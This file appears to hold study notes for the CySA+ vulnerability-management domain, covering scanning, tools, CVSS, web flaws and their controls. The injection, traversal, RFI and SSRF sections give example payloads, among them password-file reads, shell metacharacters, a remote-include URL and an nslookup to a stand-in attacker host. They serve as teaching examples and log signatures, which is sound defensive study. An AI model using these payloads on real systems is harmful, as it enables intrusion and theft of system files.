# CySA+ Notebook, Domain 2: Vulnerability Management. Original prose against CS0-003.
T = "<blockquote><span class=\"tag\">Exam trap</span>{}</blockquote>"

D2 = [
# ---------------------------------------------------------------- 2.1
dict(id="asset-discovery", o="2.1", t="Asset discovery: map scans and fingerprinting", q="fingerprint", h="""
<p>You can&rsquo;t scan what you don&rsquo;t know exists, so vulnerability management starts with inventory.</p>
<ul><li><strong>Map scans</strong> (discovery scans) find live hosts and open ports across a range: ping sweeps, ARP scans on a local segment, TCP SYN probes. Nmap <code>-sn</code> does host discovery without port scanning.</li>
<li><strong>Device fingerprinting</strong> works out what a host is: OS (from TCP/IP stack quirks, <code>nmap -O</code>), services and versions (<code>nmap -sV</code>, banner grabbing), device type (printer, switch, camera).</li></ul>
<p>Results feed the asset inventory, which then drives which scan policies apply to which hosts.</p>
"""),

dict(id="scan-considerations", o="2.1", t="Special considerations when scanning", q="scheduling", h="""
<div class="tblwrap"><table><tr><th>Consideration</th><th>What to think about</th></tr>
<tr><td>Scheduling</td><td>Scan outside business hours or in maintenance windows; stagger scans so they don&rsquo;t collide with backups</td></tr>
<tr><td>Operations</td><td>Coordinate with system owners and the change process so a scan isn&rsquo;t mistaken for an attack or blamed for an outage</td></tr>
<tr><td>Performance</td><td>Scans load the network and targets; throttle concurrency, and be careful with fragile or legacy systems</td></tr>
<tr><td>Sensitivity levels</td><td>How aggressive the checks are; high sensitivity finds more but can crash services. Disable dangerous plug-ins (DoS checks) on production</td></tr>
<tr><td>Segmentation</td><td>Firewalls between zones block or skew results; place a scanner or agent inside each segment</td></tr>
<tr><td>Regulatory requirements</td><td>PCI DSS requires quarterly internal and external scans (external by an Approved Scanning Vendor) and after significant change</td></tr></table></div>
<p><strong>How often?</strong> Frequency follows risk: the organization&rsquo;s size and risk appetite, how exposed and critical the assets are, industry and regulatory requirements, and what the team can actually remediate. Internet-facing and high-value systems are scanned more often; many organizations move toward continuous scanning with agents. Scanning more often than you can fix just grows the backlog.</p>
"""),

dict(id="scan-types", o="2.1", t="Scan types compared", q="credentialed", h="""
<div class="tblwrap"><table><tr><th>Pair</th><th>First</th><th>Second</th></tr>
<tr><td>Internal vs external</td><td>From inside the network: what an insider or someone who got in sees</td><td>From the internet: what any attacker sees first</td></tr>
<tr><td>Agent vs agentless</td><td>Software on each host reports even when off-network; good for laptops; must be deployed and maintained</td><td>Scanner connects over the network; nothing to install; misses hosts that are offline or unreachable</td></tr>
<tr><td>Credentialed vs non-credentialed</td><td>Logs in, reads installed software, patches and config; more accurate, fewer false positives</td><td>Sees only what is exposed on the network, the outsider&rsquo;s view; more guessing from banners</td></tr>
<tr><td>Passive vs active</td><td>Watches existing traffic; no load and no risk; finds only what talks</td><td>Sends probes; thorough; can disrupt fragile systems</td></tr>
<tr><td>Static vs dynamic</td><td>Analyzes code or binaries without running them (SAST, reverse engineering)</td><td>Tests the running application (DAST, fuzzing)</td></tr></table></div>
<p><strong>Reverse engineering</strong>: disassembling or decompiling a binary to understand what it does without source code (Ghidra, IDA, debuggers). <strong>Fuzzing</strong>: feeding large volumes of malformed or random input to find crashes that indicate memory bugs.</p>
<p><strong>By target</strong>, scans are usually grouped as <strong>network</strong> (hosts, open ports, services, device configurations), <strong>web application</strong> (injection, XSS, authentication and session flaws: Burp, ZAP, Nikto) and <strong>database</strong> (default accounts, weak permissions, missing patches, unencrypted sensitive columns). Most programs need all three, because a clean network scan says nothing about the app or the data store behind it.</p>
<p><strong>Automated vs. manual.</strong> Automated scanners are fast, repeatable and cover thousands of known checks, but they miss business-logic flaws and produce false positives. Manual testing by a skilled analyst finds what tools can&rsquo;t, such as chained weaknesses or broken authorization logic, but it is slow and expensive. Use automation for breadth and regular coverage, and manual review to validate findings and probe the most important systems.</p>
""" + T.format("A non-credentialed scan reporting fewer findings does not mean the host is safer. It means the scanner saw less. Credentialed scans are the accurate baseline for patch status.")),

dict(id="fuzzing-re", o="2.1", t="Fuzzing and reverse engineering", q="fuzzing", h="""
<p>CS0-003 lists both under <em>static vs. dynamic</em> analysis: fuzzing is dynamic (the program runs), reverse engineering is usually static (you study the code without running it), though analysts often combine it with debugging.</p>
<p><strong>Fuzzing</strong> throws large volumes of invalid, unexpected or random input at a program and watches for failures: crashes, hangs, memory errors, assertion failures or leaked data. Each failure points to input handling the developer didn&rsquo;t anticipate, which is where overflows and injection bugs live.</p>
<div class="tblwrap"><table><tr><th>Fuzzer part</th><th>Job</th></tr>
<tr><td><strong>Poet</strong> (generator)</td><td>Creates the test cases</td></tr>
<tr><td><strong>Courier</strong> (delivery)</td><td>Feeds each test case to the target: a file, network packet, API call or form field</td></tr>
<tr><td><strong>Oracle</strong> (monitor)</td><td>Decides whether the target failed, and records the input that caused it</td></tr></table></div>
<div class="tblwrap"><table><tr><th>How test cases are made</th><th>Idea</th><th>Trade-off</th></tr>
<tr><td><strong>Random</strong> (&ldquo;dumb&rdquo;)</td><td>Pure random data</td><td>Easy to set up; most inputs get rejected at the first validation check</td></tr>
<tr><td><strong>Mutation / template-based</strong></td><td>Takes valid sample inputs and alters them; evolutionary fuzzers keep the mutations that reach new code</td><td>Good results with little knowledge of the format</td></tr>
<tr><td><strong>Generation-based</strong> (&ldquo;smart&rdquo;)</td><td>Builds inputs from a model of the protocol or file format</td><td>Reaches deep code; the model takes effort to write</td></tr></table></div>
<p>Fuzzing belongs in testing, before release (part of a secure SDLC). Against production, it can crash the very service you are protecting, so treat it like any dangerous scan.</p>
<p><strong>Reverse engineering</strong> works backward from a compiled program to understand what it does when you have no source code. For malware, the goals are to learn its capabilities, extract indicators (C2 domains, mutex names, file paths, encryption keys), write detections, and decide how to remove it.</p>
<ul><li><strong>Tools</strong>: disassemblers and decompilers (Ghidra, IDA) for static work; debuggers (GDB, Immunity, x64dbg) to step through it as it runs; <code>strings</code> and hashing for a first look.</li>
<li><strong>Obstacles</strong>: attackers use <strong>obfuscation</strong>, <strong>packing</strong> (compressed or encrypted code that unpacks itself at run time), encryption, and anti-debugging or VM-detection tricks to slow analysts down. A packed sample shows almost nothing in <code>strings</code>, which is itself a clue.</li>
<li>Always analyze in an isolated lab or sandbox, never on a production host.</li></ul>
""" + T.format("Fuzzing finds flaws by running the program with bad input (dynamic). Reverse engineering explains a binary without its source (usually static). If the question says &ldquo;malformed input&rdquo; or &ldquo;crashes&rdquo;, it is fuzzing.")),

dict(id="critical-infra", o="2.1", t="Critical infrastructure: OT, ICS, SCADA", q="scada", h="""
<p><strong>OT</strong> is technology that controls physical processes. <strong>ICS</strong> is the broader family of control systems (PLCs, distributed control systems, HMIs). <strong>SCADA</strong> is ICS spread over a wide area, such as pipelines, power grids or water systems, with central supervisory control.</p>
<p>Why scanning them is different:</p>
<ul><li>Availability and safety come first. An aggressive scan can crash a <strong>PLC</strong> and stop a physical process.</li>
<li>Devices are old, rarely patched, and run proprietary protocols (Modbus, DNP3) with no authentication.</li>
<li>Prefer <strong>passive</strong> monitoring, vendor-approved tools, and testing in a lab or during planned shutdowns.</li></ul>
<p>Protection relies on segmentation from IT networks, strict remote-access control, and compensating controls where patching isn&rsquo;t possible.</p>
""" + T.format("For OT, &ldquo;run an active credentialed scan of the production PLCs&rdquo; is almost never the right answer. Passive discovery or scanning a test environment is.")),

dict(id="baseline-frameworks", o="2.1", t="Baseline scanning and industry frameworks", q="cis", h="""
<p><strong>Security baseline scanning</strong> checks configuration against a standard (password policy, services disabled, audit settings) rather than looking for missing patches. Results show drift from the approved build.</p>
<p>Where baselines come from: <strong>CIS Benchmarks</strong>, <strong>DISA STIGs</strong> (US Department of Defense), and vendor baselines such as <strong>Microsoft&rsquo;s security baselines</strong>. Windows alone has thousands of Group Policy settings, and only some matter for security, so Microsoft publishes recommended values with the reasoning behind each. Its Security Compliance Toolkit includes Policy Analyzer (compare your settings with the baseline) and LGPO (apply a baseline to a stand-alone machine). Start from a published baseline, document your deviations, then scan for drift.</p>
<div class="tblwrap"><table><tr><th>Framework</th><th>What it is</th></tr>
<tr><td><strong>PCI DSS</strong></td><td>Card industry standard for anyone storing, processing or transmitting card data; mandates scanning, segmentation, logging</td></tr>
<tr><td><strong>CIS Benchmarks</strong></td><td>Free, consensus hardening guides per product (Windows, Ubuntu, AWS, Kubernetes), often used as scan policies</td></tr>
<tr><td><strong>OWASP</strong></td><td>Open web-app security community: the Top 10 risk list, Testing Guide, ASVS, ZAP</td></tr>
<tr><td><strong>ISO 27000 series</strong></td><td>International standards for an information security management system; 27001 is certifiable, 27002 gives control guidance</td></tr></table></div>
"""),

# ---------------------------------------------------------------- 2.2
dict(id="assessment-tools", o="2.2", t="Assessment tools: which does what", q="nikto", h="""
<div class="tblwrap"><table><tr><th>Category</th><th>Tool</th><th>Use it for</th></tr>
<tr><td rowspan="2">Network scanning/mapping</td><td>Angry IP Scanner</td><td>Quick GUI scan of IP ranges for live hosts and open ports</td></tr>
<tr><td>Maltego</td><td>OSINT link analysis: graphs relationships between domains, people, emails, infrastructure</td></tr>
<tr><td rowspan="4">Web app scanners</td><td>Burp Suite</td><td>Intercepting proxy: capture, modify and replay requests; scanner in the paid edition</td></tr>
<tr><td>ZAP</td><td>OWASP&rsquo;s free intercepting proxy and scanner, Burp&rsquo;s open-source counterpart</td></tr>
<tr><td>Arachni</td><td>Open-source web app scanner framework (no longer maintained)</td></tr>
<tr><td>Nikto</td><td>Command-line web <em>server</em> scanner: dangerous files, outdated versions, default content, misconfigurations</td></tr>
<tr><td rowspan="2">Vulnerability scanners</td><td>Nessus</td><td>Commercial (Tenable) network vulnerability scanner with plugin-based checks</td></tr>
<tr><td>OpenVAS</td><td>Open-source vulnerability scanner (Greenbone)</td></tr>
<tr><td><em>Qualys</em> (class)</td><td>Commercial cloud-based vulnerability management platform (scanning, agents, compliance). Named in class but <strong>not on the CS0-003 tool list</strong>.</td></tr>
<tr><td rowspan="2">Debuggers</td><td>Immunity Debugger</td><td>Windows, used for exploit development and malware analysis</td></tr>
<tr><td>GDB</td><td>GNU debugger, command line, Linux/Unix programs</td></tr>
<tr><td rowspan="3">Multipurpose</td><td>Nmap</td><td>Discovery, port scanning, version and OS detection, NSE scripts</td></tr>
<tr><td>Metasploit (MSF)</td><td>Exploitation framework: validate that a vulnerability is really exploitable</td></tr>
<tr><td>Recon-ng</td><td>Modular OSINT reconnaissance framework</td></tr>
<tr><td rowspan="3">Cloud assessment</td><td>Scout Suite</td><td>Multi-cloud configuration audit (AWS, Azure, GCP)</td></tr>
<tr><td>Prowler</td><td>Security best-practice and compliance checks, mainly AWS (now also Azure and GCP)</td></tr>
<tr><td>Pacu</td><td>AWS <em>exploitation</em> framework for testing, the offensive one of the three</td></tr></table></div>
""" + T.format("Scout Suite and Prowler audit cloud configuration; Pacu attacks it. If the question says &ldquo;exploit&rdquo; or &ldquo;penetration test&rdquo; against AWS, the answer is Pacu.")),

dict(id="nmap-output", o="2.2", t="Reading Nmap output", q="nmap", h="""
<div class="tblwrap"><table><tr><th>Flag</th><th>Does</th></tr>
<tr><td><code>-sS</code></td><td>SYN (half-open) scan, the default when run as root</td></tr>
<tr><td><code>-sT</code></td><td>Full TCP connect scan</td></tr>
<tr><td><code>-sU</code></td><td>UDP scan (slow)</td></tr>
<tr><td><code>-sn</code></td><td>Host discovery only, no port scan</td></tr>
<tr><td><code>-Pn</code></td><td>Skip discovery, treat every host as up</td></tr>
<tr><td><code>-sV</code></td><td>Service and version detection</td></tr>
<tr><td><code>-O</code></td><td>OS detection</td></tr>
<tr><td><code>-A</code></td><td>Aggressive: -O, -sV, default scripts, traceroute</td></tr>
<tr><td><code>-sC</code></td><td>Default NSE scripts</td></tr>
<tr><td><code>-p 1-1000</code>, <code>-p-</code></td><td>Port range; all 65,535</td></tr>
<tr><td><code>-T0</code>&hellip;<code>-T5</code></td><td>Timing, paranoid to insane</td></tr>
<tr><td><code>-oN/-oX/-oG</code></td><td>Normal, XML, grepable output</td></tr></table></div>
<p><strong>Port states</strong>: <strong>open</strong> (a service answered), <strong>closed</strong> (host replied with a reset, nothing listening), <strong>filtered</strong> (no reply or an ICMP unreachable, so a firewall is in the way). The service column after <code>-sV</code> shows product and version, which is what you match against CVEs.</p>
""" + T.format("Filtered does not mean closed. It means Nmap can&rsquo;t tell, usually because a firewall dropped the probe.")),

dict(id="scan-report", o="2.2", t="Reading a vulnerability scan report", q="plugin", h="""
<p>A finding typically contains: plugin or check ID, name, severity, CVSS score and vector, CVE references, affected host and port, a description, the evidence the scanner saw (version banner or request/response), and a recommended fix.</p>
<p>How to read it as an analyst:</p>
<ul><li><strong>Check the evidence</strong>. If the scanner flagged a version from a banner, but the vendor backports fixes (common on Red Hat), the finding may be a false positive.</li>
<li><strong>Check the context</strong>: is the host internet-facing? Is the service even used?</li>
<li><strong>Group</strong> findings by fix: one missing cumulative update can account for forty findings.</li>
<li><strong>Informational</strong> findings (TLS details, OS detected) are not vulnerabilities but may support one.</li></ul>
"""),

# ---------------------------------------------------------------- 2.3
dict(id="cvss", o="2.3", t="CVSS interpretation", q="cvss", h="""
<p>CVSS v3.1 base metrics describe a vulnerability independent of your environment. A vector looks like <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> (score 9.8).</p>
<div class="tblwrap"><table><tr><th>Metric</th><th>Values (worst first)</th><th>Meaning</th></tr>
<tr><td>AV Attack Vector</td><td>Network, Adjacent, Local, Physical</td><td>How close the attacker must be</td></tr>
<tr><td>AC Attack Complexity</td><td>Low, High</td><td>Conditions outside the attacker&rsquo;s control</td></tr>
<tr><td>PR Privileges Required</td><td>None, Low, High</td><td>Access needed before attacking</td></tr>
<tr><td>UI User Interaction</td><td>None, Required</td><td>Does a victim have to click or open something?</td></tr>
<tr><td>S Scope</td><td>Changed, Unchanged</td><td>Can the attack affect components beyond the vulnerable one?</td></tr>
<tr><td>C / I / A Impact</td><td>High, Low, None</td><td>Effect on confidentiality, integrity, availability</td></tr></table></div>
<p>Severity bands: 0.1&ndash;3.9 Low, 4.0&ndash;6.9 Medium, 7.0&ndash;8.9 High, 9.0&ndash;10.0 Critical.</p>
<p><strong>Scope Changed</strong> means the exploit breaks out of the vulnerable component&rsquo;s security authority, such as a VM escape to the hypervisor or a browser bug that affects the OS. It pushes the score up.</p>
<p>Temporal metrics (exploit code maturity, remediation level) and environmental metrics (your asset&rsquo;s security requirements) adjust the base score. CVSS v4.0 exists (2023), but CS0-003 questions use v3.x vectors.</p>
""" + T.format("Attack Vector: Adjacent means same local network segment (Bluetooth, same subnet), not &ldquo;next to the computer&rdquo;. Physical is touching the device.")),

dict(id="validation", o="2.3", t="Validation: true and false positives and negatives", q="false positive", h="""
<div class="tblwrap"><table><tr><th></th><th>Scanner says vulnerable</th><th>Scanner says not vulnerable</th></tr>
<tr><td><strong>Really vulnerable</strong></td><td>True positive</td><td><strong>False negative</strong> (the dangerous one: a missed issue)</td></tr>
<tr><td><strong>Not vulnerable</strong></td><td><strong>False positive</strong> (wasted effort)</td><td>True negative</td></tr></table></div>
<p>Validate a finding by checking version and patch level directly on the host, re-running with credentials, comparing other tools, or confirming exploitability in a controlled test (for example Metasploit against a test copy). Document a confirmed false positive so it can be suppressed in future scans, with a review date.</p>
""" + T.format("A false negative is worse than a false positive. The scanner said you were fine and you were not, so nothing gets fixed.")),

dict(id="prioritization", o="2.3", t="Prioritizing: context, exploitability, asset value, zero-days", q="exploitability", h="""
<p>CVSS alone is a poor priority list. Combine it with:</p>
<ul><li><strong>Context</strong>: <strong>external</strong> (internet-facing) beats <strong>internal</strong>, which beats <strong>isolated</strong> (air-gapped or tightly segmented). The same 9.8 on an isolated lab box can wait behind a 7.5 on the public web server.</li>
<li><strong>Exploitability/weaponization</strong>: is there public exploit code, a Metasploit module, active exploitation? CISA&rsquo;s Known Exploited Vulnerabilities (KEV) catalog and EPSS (probability of exploitation) help here.</li>
<li><strong>Asset value</strong>: what the system does and holds. A domain controller or payment database outranks a kiosk.</li>
<li><strong>Zero-day</strong>: a flaw with no vendor patch yet. You can&rsquo;t patch, so you apply compensating controls (WAF rule, disable the feature, isolate) and watch for exploitation.</li></ul>
""" + T.format("When two findings tie on severity, the exposed, weaponized one on the high-value asset wins. Exposure and exploitation in the wild usually beat a slightly higher base score.")),

# ---------------------------------------------------------------- 2.4
dict(id="xss-csrf-ssrf", o="2.4", t="XSS, CSRF and SSRF", q="xss", h="""
<div class="tblwrap"><table><tr><th>Attack</th><th>What happens</th><th>Control</th></tr>
<tr><td><strong>Reflected XSS</strong></td><td>Script in a request parameter is echoed back in the response; victim must click a crafted link</td><td>Output encoding, input validation, Content Security Policy</td></tr>
<tr><td><strong>Persistent (stored) XSS</strong></td><td>Script is saved by the app (comment, profile) and runs for every viewer</td><td>Same, applied when storing and when rendering; HttpOnly cookies limit theft</td></tr>
<tr><td><strong>CSRF</strong></td><td>Victim&rsquo;s browser, already logged in, is tricked into sending a state-changing request the attacker crafted</td><td>Anti-CSRF tokens, SameSite cookies, re-authentication for sensitive actions</td></tr>
<tr><td><strong>SSRF</strong></td><td>Server is tricked into making requests on the attacker&rsquo;s behalf, often to internal services or cloud metadata (169.254.169.254)</td><td>Allow-list destinations, block internal ranges, IMDSv2 in AWS, validate URLs server-side</td></tr></table></div>
<p>Tell-tale log entries: <code>&lt;script&gt;</code> or <code>%3Cscript%3E</code> in parameters (XSS); a request parameter containing a URL like <code>?url=http://169.254.169.254/latest/meta-data/</code> (SSRF).</p>
""" + T.format("XSS abuses the user&rsquo;s trust in the site (script runs in their browser). CSRF abuses the site&rsquo;s trust in the user&rsquo;s browser. SSRF abuses the server&rsquo;s trust in itself.")),

dict(id="injection-traversal", o="2.4", t="Injection, directory traversal, LFI/RFI, RCE", q="injection", h="""
<ul><li><strong>SQL injection</strong>: input becomes part of a query. Signs: <code>' OR 1=1--</code>, <code>UNION SELECT</code>, database error messages. Fix: <strong>parameterized queries</strong> (prepared statements), least-privilege DB accounts, input validation.</li>
<li><strong>Command injection</strong>: input reaches a shell. Signs: <code>; cat /etc/passwd</code>, <code>| whoami</code>, <code>&amp;&amp;</code>. Fix: avoid shell calls, use safe APIs, allow-list input.</li>
<li><strong>Other injection</strong>: LDAP, XML (including <strong>XXE</strong>, where an external entity reads local files), and OS/template injection follow the same pattern.</li>
<li><strong>Directory traversal</strong>: <code>../../../../etc/passwd</code> (or <code>%2e%2e%2f</code> encoded) to read files outside the web root. Fix: canonicalize paths, allow-list file names, chroot or run with least privilege.</li>
<li><strong>LFI</strong> makes the app include a file already on the server (<code>?page=../../etc/passwd</code>); <strong>RFI</strong> makes it include a file from an attacker&rsquo;s server (<code>?page=http://evil/shell.txt</code>), which leads straight to code execution. Fix: never pass user input to include functions; disable remote includes (PHP <code>allow_url_include=Off</code>).</li>
<li><strong>RCE</strong> (remote code execution) is the outcome attackers want from many of these: running their commands on your server.</li></ul>
""" + T.format("Input validation helps, but the specific fix for SQL injection the exam wants is parameterized queries (prepared statements).")),

dict(id="overflows", o="2.4", t="Overflow vulnerabilities", q="overflow", h="""
<div class="tblwrap"><table><tr><th>Type</th><th>What goes wrong</th></tr>
<tr><td><strong>Buffer</strong></td><td>More data written to a buffer than it holds, overwriting neighboring memory</td></tr>
<tr><td><strong>Stack</strong></td><td>A buffer overflow on the stack overwrites the saved return address, so the function &ldquo;returns&rdquo; into attacker code</td></tr>
<tr><td><strong>Heap</strong></td><td>Overflow in dynamically allocated memory corrupts heap structures or adjacent objects</td></tr>
<tr><td><strong>Integer</strong></td><td>Arithmetic exceeds the type&rsquo;s range and wraps (255 + 1 = 0 in 8 bits), often producing a tiny allocation that then overflows</td></tr></table></div>
<p>Controls: bounds checking and safe functions (no <code>strcpy</code>/<code>gets</code>), memory-safe languages, compiler protections (stack canaries), <strong>DEP/NX</strong> (data areas not executable), <strong>ASLR</strong> (randomized addresses), fuzzing in testing. A long run of <code>A</code>s or <code>0x41</code>, or a NOP sled (<code>0x90 0x90...</code>), in a request or crash dump suggests an overflow attempt.</p>
"""),

dict(id="owasp-flaws", o="2.4", t="Access control, crypto failures, design and configuration flaws", q="broken access control", h="""
<ul><li><strong>Broken access control</strong> (OWASP #1): users act outside their permissions. Example: changing <code>?account=1001</code> to <code>1002</code> shows another customer (IDOR). Fix: enforce authorization server-side on every request, deny by default.</li>
<li><strong>Cryptographic failures</strong>: sensitive data unencrypted, weak algorithms (MD5 for passwords, DES, TLS 1.0), hard-coded keys. Fix: TLS 1.2+, strong salted password hashing (bcrypt, Argon2), proper key management.</li>
<li><strong>Insecure design</strong>: the flaw is in the plan, not the code, such as a password reset that relies on guessable questions. Fix: threat modeling and secure design patterns before coding.</li>
<li><strong>Security misconfiguration</strong>: default credentials, verbose errors, open cloud storage, unnecessary features enabled. Fix: hardened baselines and configuration scanning.</li>
<li><strong>End-of-life or outdated components</strong>: libraries and platforms with known CVEs or no more patches. Fix: software composition analysis, an SBOM, upgrade plans.</li>
<li><strong>Identification and authentication failures</strong>: credential stuffing allowed, weak passwords, session IDs in URLs, sessions that never expire. Fix: MFA, rate limiting, secure session handling.</li>
<li><strong>Data poisoning</strong>: corrupting the data a system learns from or trusts (machine-learning training sets, threat feeds, DNS caches) to skew its output. Fix: validate data sources, monitor model behavior, control who can write training data.</li>
<li><strong>Privilege escalation</strong>: vertical (user to admin) or horizontal (user to another user). Fix: least privilege, patching, removing SUID binaries and weak service permissions.</li></ul>
"""),

dict(id="os-command-injection", o="2.4", t="OS command injection, step by step", q="command injection", h="""
<p><strong>OS command injection</strong> happens when an application builds an operating-system command from user input and hands it to a shell. The shell treats certain characters as instructions, so the attacker can add commands of their own, and they run with the application&rsquo;s privileges.</p>
<p><strong>Worked example.</strong> An internal page lets staff ping a host: the code runs <code>ping -c 4</code> followed by whatever was typed. The input <code>10.0.0.5</code> works as intended. The input <code>10.0.0.5; cat /etc/passwd</code> makes the shell run the ping and then print the password file. On Windows the same trick uses <code>&amp;</code>: <code>10.0.0.5 &amp; whoami</code>.</p>
<div class="tblwrap"><table><tr><th>Characters</th><th>What the shell does with them</th></tr>
<tr><td><code>;</code></td><td>Runs the next command (Linux)</td></tr>
<tr><td><code>&amp;</code> and <code>&amp;&amp;</code></td><td>Runs the next command / runs it only if the first succeeded</td></tr>
<tr><td><code>|</code> and <code>||</code></td><td>Pipes output into the next command / runs it only if the first failed</td></tr>
<tr><td><code>`cmd`</code> and <code>$(cmd)</code></td><td>Runs <code>cmd</code> and inserts its output</td></tr>
<tr><td>Newline (<code>%0a</code>)</td><td>Starts a new command</td></tr></table></div>
<p><strong>Blind command injection</strong> returns no output, so testers prove it with timing (<code>; sleep 10</code>, or <code>&amp; ping -n 11 127.0.0.1</code> on Windows, makes the response about ten seconds slower) or with out-of-band traffic (<code>; nslookup test.attacker.example</code>).</p>
<p><strong>In the logs:</strong> URL-encoded metacharacters in parameters (<code>%3B</code> for <code>;</code>, <code>%7C</code> for <code>|</code>, <code>%26</code> for <code>&amp;</code>) followed by recon commands such as <code>whoami</code>, <code>id</code>, <code>uname -a</code> or <code>ipconfig</code>.</p>
<p><strong>Controls, best first:</strong></p>
<ol><li>Don&rsquo;t call the shell. Use the language&rsquo;s own library function for the job.</li>
<li>If a program must run, pass the arguments as a list to an API that starts it without a shell (for example Python <code>subprocess.run([...], shell=False)</code>), so metacharacters stay literal text.</li>
<li>Allow-list the input: for the ping page, accept only a valid IP address or hostname pattern.</li>
<li>Run the application with least privilege, so an injected command can do less.</li>
<li>A WAF rule is a compensating control while the code is fixed, not the fix.</li></ol>
<p>Same family as SQL injection, different interpreter: SQL injection targets the database&rsquo;s query parser, command injection targets the operating system&rsquo;s shell.</p>
""" + T.format("Escaping or blocklisting a few characters is the weakest fix, because attackers find the one you missed. The preferred answer is to avoid the shell or pass arguments safely, the same logic as parameterized queries for SQL injection.")),

dict(id="data-poisoning", o="2.4", t="Data poisoning", q="poisoning", h="""
<p><strong>Data poisoning</strong> attacks a system through the data it learns from or relies on. Instead of breaking the code, the attacker feeds it bad data so its output becomes wrong in a way that suits them. It is an integrity attack.</p>
<div class="tblwrap"><table><tr><th>Kind</th><th>Goal</th><th>Example</th></tr>
<tr><td>Availability (indiscriminate)</td><td>Degrade accuracy across the board</td><td>Flooding a spam filter&rsquo;s feedback loop with mislabeled mail until the filter stops being useful</td></tr>
<tr><td>Targeted</td><td>Make the model wrong about specific inputs</td><td>Getting one malware family labeled benign so the classifier lets it through</td></tr>
<tr><td>Backdoor</td><td>Normal behavior until a planted trigger appears</td><td>A small pattern in a file that makes the detector report it as clean</td></tr></table></div>
<p>Security tools are exposed too: anomaly detection that learns its baseline while an intruder is already active, threat intelligence feeds seeded with false indicators so defenders block legitimate services, and user-feedback features (&ldquo;not spam&rdquo;) that an attacker can vote on at scale.</p>
<p>Don&rsquo;t confuse poisoning with <strong>evasion</strong>. Poisoning corrupts the training data before the model is built; evasion crafts inputs that fool a model that is already trained.</p>
<p><strong>Controls:</strong></p>
<ul><li><strong>Provenance:</strong> know where every training set came from, prefer vetted sources, and hash or sign data sets so tampering shows.</li>
<li><strong>Access control on the pipeline:</strong> limit who and what can write training data and labels.</li>
<li><strong>Validation:</strong> outlier and duplicate detection, label audits, rate limits on user feedback.</li>
<li><strong>Monitoring:</strong> track accuracy and drift against a trusted, held-out test set and alert on sudden changes.</li>
<li><strong>Recovery:</strong> keep known-good data and model snapshots so you can roll back and retrain.</li></ul>
""" + T.format("Encrypting the training data protects confidentiality, but poisoning is an integrity problem. The fitting controls are provenance, access control on who can write the data, and validation.")),

dict(id="key-management", o="2.4", t="Cryptographic failures and key management", q="cryptographic", h="""
<p>Strong algorithms still fail when the keys are handled badly, and many cryptographic failures come down to keys rather than math. The <strong>key lifecycle</strong>: generate (from a strong random source), distribute, store, use, rotate, revoke, back up or escrow, and destroy.</p>
<div class="tblwrap"><table><tr><th>Approach</th><th>How it works</th><th>Strengths</th><th>Weaknesses</th></tr>
<tr><td><strong>Centralized</strong></td><td>One team and one system (a KMS backed by an HSM) set policy and hold keys for the whole organization</td><td>Consistent policy, one audit trail, quick rotation and revocation</td><td>A high-value target and single point of failure, so it needs redundancy</td></tr>
<tr><td><strong>Distributed</strong> (decentralized)</td><td>Each department or application runs its own key management, with or without coordination</td><td>Local control, no single point of failure</td><td>Inconsistent practice, key sprawl, hard to audit or revoke quickly</td></tr></table></div>
<p><strong>Where keys belong:</strong> a <strong>hardware security module (HSM)</strong>, a tamper-resistant device that generates and uses keys without exposing them in plaintext (validated to FIPS 140-2 or 140-3); a cloud <strong>key management service</strong> (AWS KMS, Azure Key Vault, Google Cloud KMS); or a secrets manager for application credentials. Large systems use <strong>envelope encryption</strong>: a data key encrypts the data, and a key-encryption key held in the KMS encrypts the data key.</p>
<p><strong>Failures to recognize:</strong> keys hard-coded in source or committed to a repository, the key stored on the same server as the data it protects, one key shared across many systems, keys that are never rotated, private keys readable by any user, and expired or self-signed certificates in production.</p>
<p><strong>Controls:</strong> keep keys separate from the data, rotate on a schedule and after any suspected exposure, apply least privilege to key use, log every key operation, and run secret scanning in the CI pipeline to catch keys before they are committed.</p>
""" + T.format("Data encrypted with AES-256 is still exposed if the key sits in a config file beside it. An answer that moves keys into an HSM or KMS usually fixes the real problem.")),

# ---------------------------------------------------------------- 2.5
dict(id="nsa-mitigations", o="2.4", t="NSA's top ten mitigation strategies", q="mitigation", h="""
<p>A widely cited short list of controls from the US National Security Agency. Useful as a checklist when a question asks for the best general mitigation.</p>
<div class="tblwrap"><table><tr><th>#</th><th>Strategy</th><th>In CySA+ terms</th></tr>
<tr><td>1</td><td>Update and upgrade software immediately</td><td>Patch management</td></tr>
<tr><td>2</td><td>Defend privileges and accounts</td><td>Least privilege, PAM</td></tr>
<tr><td>3</td><td>Enforce signed software execution policies</td><td>Application allow-listing, code signing</td></tr>
<tr><td>4</td><td>Exercise a system recovery plan</td><td>Tested backups, BC/DR</td></tr>
<tr><td>5</td><td>Actively manage systems and configurations</td><td>Asset inventory, baselines, configuration management</td></tr>
<tr><td>6</td><td>Continuously hunt for network intrusions</td><td>Threat hunting, assume breach</td></tr>
<tr><td>7</td><td>Leverage modern hardware security features</td><td>TPM, Secure Boot, UEFI</td></tr>
<tr><td>8</td><td>Segregate networks using application-aware defenses</td><td>Segmentation, next-generation firewalls</td></tr>
<tr><td>9</td><td>Integrate threat reputation services</td><td>Threat intelligence feeds, IP and domain reputation</td></tr>
<tr><td>10</td><td>Transition to multi-factor authentication</td><td>MFA</td></tr></table></div>
"""),

dict(id="vm-program", o="2.5", t="Running a vulnerability management program", q="vulnerability management", h="""
<p>Scanning is one step in a cycle, not the program itself. A <strong>vulnerability management program</strong> is the policy and process around it: what gets scanned and how often, who owns each asset, how findings are prioritized, how fast each severity must be fixed (SLOs), how exceptions are approved, and how results are reported.</p>
<p>The cycle: <strong>discover assets</strong> &rarr; <strong>scan</strong> &rarr; <strong>validate and prioritize</strong> &rarr; <strong>remediate or mitigate</strong> &rarr; <strong>verify with a rescan</strong> &rarr; <strong>report</strong> &rarr; repeat.</p>
<div class="tblwrap"><table><tr><th>Common challenge</th><th>What helps</th></tr>
<tr><td>False positives waste time and erode trust in the scanner</td><td>Credentialed scans, validation before ticketing, documented suppressions with review dates</td></tr>
<tr><td>Limited resources: more findings than people or maintenance windows</td><td>Risk-based prioritization (exposure, exploitation, asset value) instead of fixing by raw count</td></tr>
<tr><td>Shortage of skilled staff</td><td>Automation and orchestration for routine work; training; managed services where needed</td></tr>
<tr><td>Outdated scanner or plug-ins miss new vulnerabilities</td><td>Keep scanner software and feeds current</td></tr>
<tr><td>System owners not engaged</td><td>Involve stakeholders early, report in their terms, agree on SLOs</td></tr></table></div>
